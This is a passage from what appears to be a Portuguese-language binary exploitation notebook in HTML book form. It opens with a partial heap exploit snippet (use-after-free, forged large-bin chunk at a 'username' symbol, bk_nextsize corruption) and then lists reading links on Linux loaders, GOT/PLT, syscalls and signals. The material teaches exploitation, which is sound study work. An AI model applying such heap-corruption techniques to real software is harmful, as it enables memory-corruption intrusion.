malloc(0x18) # Previvir consolidação A B
chunk_B = malloc(0x3f8)
malloc(0x18) #  Previvir consolidação B TOP

free(chunk_A)
free(chunk_B)

change_username(flat(
    0,
    0x501,#size
    elf.sym.username,#fd
    elf.sym.username,#bk
    0,#fd_nextsize
    0,#bk_nextsize
)) 

malloc( 0x418 ) # sort chunk_A -&gt; large 0x400

edit_chunk_A(flat(0,0,0,elf.sym.username))# UAF Corromper bk_nextsize

chunk_A = malloc(TAMANHO CHUNK_A)
chunk_FAKE = malloc(TAMANHO CHUNK_A))
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="linux-internals"><a class="header" href="#linux-internals">Linux Internals</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="prerequisitos"><a class="header" href="#prerequisitos">Prerequisitos</a></h1>
<p>Tanto coisas que eu ja comentei nesse livrinho quanto coisas que deu preguiça..
. hehe</p>
<ul>
<li>Loader, Linker, GOT e PLT
<ul>
<li><a href="https://manybutfinite.com/post/anatomy-of-a-program-in-memory/">Anatomy of a program in memory</a></li>
<li><a href="https://www.pwnthebox.net/reverse/engineering/and/binary/exploitation/series/2019/11/10/understanding-the-loader-part1-how-does-an-executable-get-loaded-to-memory.html">Understanding the Loader - Part1</a></li>
<li><a href="https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html">PLT and GOT - the key to code sharing and dynamic libraries</a></li>
</ul>
</li>
<li>Syscalls
<ul>
<li><a href="https://man7.org/linux/man-pages/man2/syscall.2.html">man syscalls</a> </li>
<li><a href="https://chromium.googlesource.com/chromiumos/docs/+/HEAD/constants/syscalls.md">Em arquiteturas comuns</a></li>
</ul>
</li>
<li>Signals e Processos
<ul>
<li><a href="https://www.win.tue.nl/%7Eaeb/linux/lk/lk-5.html">The Linux kernel: Signals</a></li>
<li><a href="https://linoxide.com/how-tos/signal-handling-linux-signal-function/">Signal Handling In Linux Through The signal() Function</a></li>
</ul>
</li>
</ul>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
            </nav>

        </div>

        <script type="text/javascript">
            window.playground_copyable = true;
        </script>
        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
        <script type="text/javascript">
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>
    </body>
</html>
